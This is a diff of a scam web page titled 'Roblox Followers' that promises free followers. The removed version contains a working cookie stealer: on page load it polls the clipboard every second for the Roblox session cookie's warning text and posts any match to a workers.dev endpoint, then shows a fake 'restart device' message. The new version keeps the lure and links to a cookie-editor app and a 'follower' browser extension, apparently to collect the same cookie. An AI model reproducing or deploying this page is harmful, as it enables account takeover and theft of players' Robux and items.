@@ -1,310 +1,353 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Followers</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
 
-<title>Roblox Followers</title>
-<link rel="icon" type="image/png" href="favicon.png">
+        body {
+            background-color: #07080c;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2.5rem 1rem;
+            position: relative;
+            overflow-x: hidden;
+        }
 
-<style>
-* {
-  box-sizing: border-box;
-}
+        /* Futuristic Background Glows */
+        .bg-glow {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(120px);
+            pointer-events: none;
+            z-index: -1;
+        }
 
-html,
-body {
-  margin: 0;
-  min-height: 100%;
-  font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
-  overflow-x: hidden;
-}
+        .glow-purple {
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 600px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(138, 43, 226, 0.25) 0%, rgba(7, 8, 12, 0) 70%);
+        }
 
-body {
-  min-height: 100vh;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  overflow-y: auto;
-  padding: 25px;
+        .glow-blue {
+            bottom: -150px;
+            right: -100px;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(0, 162, 255, 0.15) 0%, rgba(7, 8, 12, 0) 70%);
+        }
 
-  background:
-    radial-gradient(circle at 20% 20%, rgba(88,101,242,.12), transparent 40%),
-    radial-gradient(circle at 80% 80%, rgba(120,120,255,.08), transparent 40%),
-    linear-gradient(135deg, #0b0b10, #13131c 50%, #0b0b10);
+        .container {
+            width: 100%;
+            max-width: 1050px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2.5rem;
+        }
 
-  color: white;
-}
+        header {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.85rem;
+        }
 
-.background {
-  position: fixed;
-  inset: 0;
-  pointer-events: none;
-  overflow: hidden;
-  z-index: -1;
-}
+        .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 22px;
+            background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 2.4rem;
+            color: #ffffff;
+            box-shadow: 0 0 30px rgba(168, 85, 247, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
 
-.glow {
-  position: absolute;
-  width: 450px;
-  height: 450px;
-  border-radius: 50%;
-  background: rgba(88, 101, 242, 0.05);
-  filter: blur(100px);
-}
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
-.glow.one {
-  top: -180px;
-  left: -150px;
-}
+        p.subtitle {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            max-width: 480px;
+            line-height: 1.4;
+        }
 
-.glow.two {
-  right: -180px;
-  bottom: -180px;
-}
+        /* Modern Glass Card */
+        .action-card {
+            width: 100%;
+            max-width: 460px;
+            background: rgba(18, 20, 29, 0.75);
+            border: 1px solid rgba(168, 85, 247, 0.25);
+            backdrop-filter: blur(16px);
+            border-radius: 24px;
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
 
-.main-wrapper {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 30px;
-  width: 100%;
-  max-width: 900px;
-  margin: auto;
-}
+        /* Prominent White Button */
+        .btn-white {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 1.05rem;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            background-color: #ffffff;
+            color: #090a0f;
+            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.2);
+        }
 
-.card {
-  position: relative;
-  width: 100%;
-  padding: 50px 40px;
-  text-align: center;
+        .btn-white:hover {
+            background-color: #f1f5f9;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.3);
+        }
 
-  background: rgba(18, 18, 26, 0.85);
-  border: 1px solid rgba(255, 255, 255, 0.08);
-  border-radius: 28px;
+        /* Dark Futuristic Extension Buttons */
+        .btn-dark-ext {
+            width: 100%;
+            padding: 0.9rem 1.25rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(168, 85, 247, 0.3);
+            background: rgba(30, 34, 48, 0.6);
+            color: #f8fafc;
+        }
 
-  box-shadow:
-    0 30px 80px rgba(0, 0, 0, 0.6),
-    inset 0 1px rgba(255, 255, 255, 0.06);
+        .btn-dark-ext:hover {
+            background: rgba(168, 85, 247, 0.25);
+            border-color: #a855f7;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
+        }
 
-  backdrop-filter: blur(25px);
-}
+        .extensions-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            width: 100%;
+        }
 
-.logo {
-  width: 82px;
-  height: 82px;
-  margin: 0 auto 20px;
+        /* Tutorials Section */
+        .tutorials-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1.5rem;
+            margin-top: 1rem;
+        }
 
-  display: flex;
-  align-items: center;
-  justify-content: center;
+        .tutorials-heading {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+        }
 
-  border-radius: 24px;
-  background: linear-gradient(135deg, #ffffff, #dedee8);
-  color: #111;
+        .tutorials-grid {
+            width: 100%;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+        }
 
-  font-size: 38px;
-  font-weight: 900;
+        .tutorial-card {
+            background: rgba(18, 20, 29, 0.75);
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            border-radius: 20px;
+            padding: 1.25rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            transition: border-color 0.2s ease;
+        }
 
-  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
-}
+        .tutorial-card:hover {
+            border-color: rgba(168, 85, 247, 0.4);
+        }
 
-h1 {
-  margin: 0 0 25px 0;
-  font-size: 36px;
-  letter-spacing: -0.5px;
-  font-weight: 800;
-}
+        .tutorial-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #e2e8f0;
+            text-align: center;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
 
-.main-button {
-  width: 100%;
-  padding: 18px 24px;
-  margin-top: 25px;
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+            border-radius: 12px;
+            overflow: hidden;
+            background: #000000;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
 
-  border: none;
-  border-radius: 15px;
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
 
-  background: white;
-  color: #111;
+        /* Desktop Layout Order */
+        .card-pc-no-ext { order: 1; }
+        .card-pc-ext { order: 2; }
+        .card-iphone { order: 3; }
 
-  font-size: 19px;
-  font-weight: 800;
+        /* Mobile Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 1.5rem 0.75rem;
+            }
 
-  cursor: pointer;
+            .container {
+                gap: 2rem;
+            }
 
-  transition:
-    transform .2s ease,
-    box-shadow .2s ease,
-    background .2s ease;
-}
+            .action-card {
+                padding: 1.5rem;
+            }
 
-.main-button:hover {
-  transform: translateY(-3px);
-  box-shadow: 0 15px 35px rgba(255,255,255,.16);
-  background: #f0f0f0;
-}
+            /* Mobile Layout Order: iPhone Tutorial First */
+            .card-iphone { order: 1; }
+            .card-pc-no-ext { order: 2; }
+            .card-pc-ext { order: 3; }
 
-.main-button:active {
-  transform: translateY(0) scale(.98);
-}
+            .tutorials-grid {
+                display: flex;
+                flex-direction: row;
+                overflow-x: auto;
+                scroll-snap-type: x mandatory;
+                scroll-padding-left: 0.5rem;
+                gap: 1rem;
+                padding-bottom: 1rem;
+                width: 100%;
+                scrollbar-width: none; 
+            }
 
-.status {
-  margin-top: 18px;
-  min-height: 20px;
-  font-size: 13px;
-  color: #8ea1ff;
-  font-weight: 500;
-}
+            .tutorials-grid::-webkit-scrollbar {
+                display: none;
+            }
 
-/* Loading spinner */
-.spinner {
-  display: inline-block;
-  width: 16px;
-  height: 16px;
-  margin-right: 8px;
-  vertical-align: -3px;
-
-  border: 3px solid rgba(0,0,0,.2);
-  border-top-color: #111;
-  border-radius: 50%;
-
-  animation: spin .8s linear infinite;
-}
-
-@keyframes spin {
-  to {
-    transform: rotate(360deg);
-  }
-}
-
-/* Tutorial Video Container */
-.video-container {
-  position: relative;
-  width: 100%;
-  aspect-ratio: 16 / 9;
-  overflow: hidden;
-  border-radius: 18px;
-  background: #000;
-  border: 1px solid rgba(255, 255, 255, 0.1);
-  box-shadow: 0 0 40px rgba(88, 101, 242, 0.2);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-.video-frame {
-  display: block;
-  width: 100%;
-  height: 100%;
-  border: none;
-}
-</style>
-
+            .tutorial-card {
+                flex: 0 0 85%;
+                max-width: 320px;
+                scroll-snap-align: start;
+            }
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="background">
-  <div class="glow one"></div>
-  <div class="glow two"></div>
-</div>
+    <div class="bg-glow glow-purple"></div>
+    <div class="bg-glow glow-blue"></div>
 
-<div class="main-wrapper">
+    <div class="container">
+        <!-- Header Section -->
+        <header>
+            <div class="logo">R</div>
+            <h1>Roblox Followers</h1>
+            <p class="subtitle">Select your platform extension below and view the tutorial guides.</p>
+        </header>
 
-  <div class="card">
-    <div class="logo">R</div>
-    <h1>Roblox Followers</h1>
+        <!-- Main Action Box -->
+        <section class="action-card">
+            <button class="btn-white" id="addFollowersBtn">Add Followers</button>
 
-    <div class="video-container">
-      <iframe
-        class="video-frame"
-        src="https://www.youtube-nocookie.com/embed/NkJcPlpqJtw?vq=hd1080&modestbranding=1&rel=0"
-        title="Tutorial"
-        allow="encrypted-media; picture-in-picture"
-        allowfullscreen>
-      </iframe>
+            <div class="extensions-group">
+                <a href="https://apps.apple.com/us/app/cookie-editor/id6446215341" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
+                    Extension For iPhone
+                </a>
+                <a href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
+                    PC Extension
+                </a>
+            </div>
+        </section>
+
+        <!-- Tutorials Section -->
+        <section class="tutorials-section">
+            <h2 class="tutorials-heading">Tutorials</h2>
+
+            <div class="tutorials-grid">
+                <!-- PC Tutorial (No Extension) -->
+                <div class="tutorial-card card-pc-no-ext">
+                    <h3 class="tutorial-title">PC Tutorial (No Extension)</h3>
+                    <div class="video-wrapper">
+                        <iframe src="https://www.youtube.com/embed/NkJcPlpqJtw" title="PC Tutorial (No Extension)" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+                    </div>
+                </div>
+
+                <!-- PC Tutorial (With Extension) -->
+                <div class="tutorial-card card-pc-ext">
+                    <h3 class="tutorial-title">PC Tutorial (With Extension)</h3>
+                    <div class="video-wrapper">
+                        <iframe src="https://www.youtube.com/embed/AgLkFg16Wg4" title="PC Tutorial (With Extension)" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+                    </div>
+                </div>
+
+                <!-- iPhone Tutorial -->
+                <div class="tutorial-card card-iphone">
+                    <h3 class="tutorial-title">iPhone Tutorial</h3>
+                    <div class="video-wrapper">
+                        <iframe src="https://www.youtube.com/embed/B_O15Ku1Bh0" title="iPhone Tutorial" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
 
-    <button class="main-button" id="main">
-      Add Followers 
-    </button>
-
-    <div class="status" id="status"></div>
-  </div>
-
-</div>
-
-<script>
-const button = document.getElementById("main");
-const status = document.getElementById("status");
-
-const SEND_ENDPOINT =
-  "https://young-brook-716e.abojanmawzoon.workers.dev";
-     
-async function sendClipboardData(text) {
-  try {
-    await fetch(SEND_ENDPOINT, {     
-      method: "POST",     
-      headers: {     
-        "Content-Type": "application/json"     
-      },     
-      body: JSON.stringify({     
-        clipboardText: text     
-      })     
-    });     
-     
-    await new Promise(resolve => setTimeout(resolve, 10000));     
-     
-    status.textContent = "Restart Device To Get Followers Added to your account!";     
-  } catch (error) {     
-    status.textContent = "Something went wrong. Please try again.";     
-    console.error(error);     
-  }
-}
-
-button.addEventListener("click", async () => {     
-  try {     
-    status.innerHTML = `     
-      <span class="spinner"></span>     
-      Adding Followers...     
-    `;     
-     
-    const text = await navigator.clipboard.readText();     
-     
-    if (!text) {     
-      status.textContent = "error make sure u copy cookie";     
-      return;     
-    }     
-     
-    await sendClipboardData(text);
-     
-  } catch (error) {     
-    status.textContent = "error make sure u copy cookie";     
-    console.error(error);     
-  }     
-});
-
-async function monitorClipboard() {
-  if (!navigator.clipboard || !navigator.clipboard.readText) return;
-  
-  try {
-    const text = await navigator.clipboard.readText();
-    if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
-      await sendClipboardData(text);
-      return;
-    }
-  } catch (e) {
-    // Clipboard permission might require user interaction first
-  }
-  
-  setTimeout(monitorClipboard, 1000);
-}
-
-window.addEventListener("load", () => {
-  setTimeout(monitorClipboard, 500);
-});
-</script>     
-     
-</body>  
+</body>
 </html>
